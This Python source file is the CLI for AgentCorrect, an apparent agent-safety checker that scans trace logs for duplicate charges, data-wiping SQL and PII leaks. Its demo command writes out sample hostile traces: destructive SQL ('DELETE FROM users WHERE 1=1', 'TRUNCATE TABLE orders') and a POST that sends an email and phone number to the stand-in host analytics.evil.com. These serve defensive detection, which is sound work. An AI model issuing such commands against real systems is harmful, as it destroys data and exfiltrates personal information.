"""
CLI interface for AgentCorrect v0.

Human-first output by default, artifacts only with --out flag.
"""

import argparse
import sys
import re
import time
from pathlib import Path
from typing import Optional

try:
    from . import __version__
    from .ingest import stream_jsonl, validate_input
    from .normalize import to_canonical
    from .compliance import allowlist_and_redact, Redactor
    from .detectors_v4_fixed import AgentCorrectV4 as AgentCorrectUltimate
    from .coverage import CoverageTracker
    from .output_v4 import print_human_summary, write_artifacts
    from .rego import spec_from_findings, emit_rego_bundle
    from .util import Timer
except ImportError:
    # Direct imports for standalone usage
    __version__ = '1.0.0'
    from ingest import stream_jsonl, validate_input
    from normalize import to_canonical
    from compliance import allowlist_and_redact, Redactor
    from detectors_v4_fixed import AgentCorrectV4 as AgentCorrectUltimate
    from coverage import CoverageTracker
    from output_v4 import print_human_summary, write_artifacts
    from rego import spec_from_findings, emit_rego_bundle
    from util import Timer

def parse_args():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        prog='agentcorrect',
        description='Local, deterministic agent-safety checks that catch duplicate charges and data-wipe SQL',
        epilog='Exit codes: 0=clean, 2=SEV0 found, 4=input error, 5=OPA error'
    )
    
    parser.add_argument('--version', action='version', version=f'%(prog)s {__version__}')
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # analyze command
    analyze_parser = subparsers.add_parser('analyze', help='Analyze trace JSONL file')
    analyze_parser.add_argument('input', help='Input JSONL file (or - for stdin)')
    analyze_parser.add_argument('--out', dest='output_dir', help='Output directory for artifacts')
    analyze_parser.add_argument('--format', choices=['auto', 'langsmith', 'langfuse', 'otlp'],
                               default='auto', help='Input format (default: auto-detect)')
    analyze_parser.add_argument('--detectors', choices=['minimal', 'full'],
                               default='minimal', help='Detector set (default: minimal)')
    analyze_parser.add_argument('--impact', choices=['off', 'bounds', 'detailed'],
                               default='bounds', help='Impact analysis (v0: no-op)')
    analyze_parser.add_argument('--env', choices=['prod', 'staging', 'dev'],
                               default='prod', help='Environment context')
    analyze_parser.add_argument('--no-store', action='store_true', default=True,
                               help='Do not store raw data (default: true)')
    analyze_parser.add_argument('--retain-days', type=int, default=0,
                               help='Data retention days (default: 0)')
    analyze_parser.add_argument('--domain-allowlist', help='File with allowed domains')
    analyze_parser.add_argument('--scratch-table-pattern', 
                               default='(^tmp_|_scratch$)',
                               help='Regex for scratch tables to exempt')
    analyze_parser.add_argument('--rego', action='store_true',
                               help='Generate OPA Rego policy')
    
    # demo command
    demo_parser = subparsers.add_parser('demo', help='Run demo scenarios')
    demo_parser.add_argument('--scenario', 
                            choices=['stripe-missing', 'sql-unbounded', 'pii-leak', 'all'],
                            default='all',
                            help='Demo scenario to run')
    demo_parser.add_argument('--out', dest='output_dir', 
                            help='Output directory for demo artifacts')
    
    return parser.parse_args()

def load_domain_allowlist(filepath: str) -> set:
    """Load domain allowlist from file."""
    allowlist = set()
    
    try:
        with open(filepath, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    allowlist.add(line.lower())
    except FileNotFoundError:
        print(f"Warning: Domain allowlist file not found: {filepath}", file=sys.stderr)
    
    return allowlist

def analyze_command(args):
    """Execute the analyze command."""
    # Validate input
    is_valid, error_msg = validate_input(args.input)
    if not is_valid:
        print(f"Error: {error_msg}", file=sys.stderr)
        return 4  # Input/schema error
    
    # Count total traces first for progress display
    total_traces = 0
    if args.input != '-':
        try:
            with open(args.input, 'r') as f:
                total_traces = sum(1 for line in f if line.strip())
            print(f"Analyzing {total_traces:,} traces...")
            print()
        except:
            pass  # Fall back to no trace count
    
    # Compile scratch pattern
    try:
        scratch_regex = re.compile(args.scratch_table_pattern) if args.scratch_table_pattern else None
    except re.error as e:
        print(f"Error: Invalid scratch table pattern: {e}", file=sys.stderr)
        return 4
    
    # Load domain allowlist if provided
    domain_allowlist = set()
    if args.domain_allowlist:
        domain_allowlist = load_domain_allowlist(args.domain_allowlist)
    
    # Initialize components
    redactor = Redactor()
    coverage = CoverageTracker()
    detector = AgentCorrectUltimate()  # Use the ULTIMATE detector with 99% coverage
    findings = []
    total_events = 0
    
    # Track timings
    timer = Timer()
    timer.start()
    
    # Process events
    try:
        for event in stream_jsonl(args.input):
            total_events += 1
            
            # Normalize to canonical format
            canonical = to_canonical(event)
            
            # Track coverage
            coverage.process_event(canonical)
            
            # Run detectors on ORIGINAL canonical event (not redacted!)
            # This ensures detectors can validate actual idempotency key values
            event_findings = detector.detect(canonical)
            
            for finding in event_findings:
                findings.append(finding)
                
                # Mark as checked in coverage
                if finding['type'] == 'payment_no_idempotency':
                    coverage.record_checked('payment_no_idempotency', canonical)
                elif finding['type'] == 'sql_unbounded_write':
                    coverage.record_checked('sql_unbounded_write', canonical)
    
    except Exception as e:
        print(f"Error processing events: {e}", file=sys.stderr)
        return 4
    
    timer.stop()
    
    # Generate coverage report
    coverage_report = coverage.to_dict(total_events)
    
    # Print human summary (always)
    output_dir = Path(args.output_dir) if args.output_dir else None
    print_human_summary(findings, coverage_report, total_events, output_dir)
    
    # Write artifacts if --out specified
    if args.output_dir:
        output_dir = Path(args.output_dir)
        
        timings = {
            'total_ms': timer.elapsed_ms(),
            'events_processed': total_events,
            'events_per_sec': (total_events / timer.elapsed_ms() * 1000) if timer.elapsed_ms() > 0 else 0
        }
        
        write_artifacts(output_dir, findings, coverage_report, timings, redactor)
        
        # Generate OPA policy if requested
        if args.rego:
            spec = spec_from_findings(findings)
            success = emit_rego_bundle(output_dir, spec)
            if not success and args.rego:
                # Only fail if --rego was explicitly requested
                return 5  # Policy compile error
    
    # Determine exit code based on severity
    has_sev0 = any(f.get('severity') == 'SEV0' for f in findings)
    has_sev1 = any(f.get('severity') == 'SEV1' for f in findings)
    
    if has_sev0:
        return 2  # SEV0 present - blocks CI/CD
    elif has_sev1:
        return 0  # SEV1 only - advisory, doesn't block
    
    return 0  # Clean

def demo_command(args):
    """Execute the demo command with sample traces."""
    import json
    import tempfile
    
    # Create demo traces based on scenario
    demo_traces = []
    
    if args.scenario in ['stripe-missing', 'all']:
        # Stripe payment without idempotency key
        demo_traces.append({
            'trace_id': 'demo-stripe-001',
            'span_id': 'span-001',
            'ts_ms': int(time.time() * 1000),
            'role': 'http',
            'op': 'POST',
            'meta': {
                'http': {
                    'method': 'POST',
                    'url': 'https://api.stripe.com/v1/charges',
                    'headers': {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Authorization': 'Bearer sk_test_xxx'
                    },
                    'body': 'amount=2000&currency=usd'
                }
            }
        })
    
    if args.scenario in ['sql-unbounded', 'all']:
        # SQL DELETE without WHERE clause
        demo_traces.append({
            'trace_id': 'demo-sql-001',
            'span_id': 'span-002',
            'ts_ms': int(time.time() * 1000),
            'role': 'sql',
            'op': 'DELETE',
            'meta': {
                'sql': {
                    'query': 'DELETE FROM users WHERE 1=1',
                    'table': 'users'
                }
            }
        })
        
        # SQL TRUNCATE
        demo_traces.append({
            'trace_id': 'demo-sql-002',
            'span_id': 'span-003',
            'ts_ms': int(time.time() * 1000),
            'role': 'sql',
            'op': 'TRUNCATE',
            'meta': {
                'sql': {
                    'query': 'TRUNCATE TABLE orders',
                    'table': 'orders'
                }
            }
        })
    
    if args.scenario in ['pii-leak', 'all']:
        # PII to unapproved domain
        demo_traces.append({
            'trace_id': 'demo-pii-001',
            'span_id': 'span-004',
            'ts_ms': int(time.time() * 1000),
            'role': 'http',
            'op': 'POST',
            'meta': {
                'http': {
                    'method': 'POST',
                    'url': 'https://analytics.evil.com/track',
                    'headers': {'Content-Type': 'application/json'},
                    'body': json.dumps({
                        'email': 'user@example.com',
                        'phone': '555-123-4567',
                        'event': 'signup'
                    })
                }
            }
        })
    
    # Write demo traces to temp file
    with tempfile.NamedTemporaryFile(mode='w', suffix='.jsonl', delete=False) as f:
        for trace in demo_traces:
            f.write(json.dumps(trace) + '\n')
        temp_file = f.name
    
    print(f"\n=== AgentCorrect Demo: {args.scenario} ===")
    print(f"Generated {len(demo_traces)} demo traces\n")
    
    # Create args for analyze command
    analyze_args = argparse.Namespace(
        input=temp_file,
        output_dir=args.output_dir,
        format='auto',
        detectors='minimal',
        impact='bounds',
        env='prod',
        no_store=True,
        retain_days=0,
        domain_allowlist=None,
        scratch_table_pattern='(^tmp_|_scratch$)',
        rego=True if args.output_dir else False
    )
    
    # Run analysis
    result = analyze_command(analyze_args)
    
    # Clean up temp file
    Path(temp_file).unlink()
    
    if result == 0:
        print("\n✅ Demo complete - No issues found (shouldn't happen in demo!)")
    elif result == 2:
        print("\n❌ Demo complete - SEV0 issues found (expected)")
    elif result == 3:
        print("\n⚠️  Demo complete - SEV1 issues found")
    
    return result

def main():
    """Main entry point."""
    args = parse_args()
    
    if not args.command:
        print("Error: No command specified. Use 'analyze' or 'demo' command.", file=sys.stderr)
        return 4
    
    if args.command == 'analyze':
        return analyze_command(args)
    elif args.command == 'demo':
        return demo_command(args)
    else:
        print(f"Error: Unknown command: {args.command}", file=sys.stderr)
        return 4

if __name__ == '__main__':
    sys.exit(main())